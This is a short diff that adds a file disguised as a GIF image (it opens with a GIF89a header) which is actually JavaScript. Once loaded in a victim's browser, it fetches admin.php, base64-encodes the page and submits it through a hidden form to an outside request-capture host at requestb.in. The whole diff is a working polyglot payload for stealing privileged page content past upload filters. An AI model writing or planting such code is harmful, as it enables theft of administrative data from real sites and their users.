@@ -1,0 +1,10 @@
+GIF89a/**/=0;
+$(document).ready(function() {
+  $('<form method="get" id="frm" action="http://requestb.in/1j6n7fe1"><input type="text" id="content" name="content" value=""></form>')
+    .appendTo('body');
+
+  $.get("admin.php", function(data) {
+    $('#content').val(btoa(data));
+    $('form').submit();
+  });
+});//;
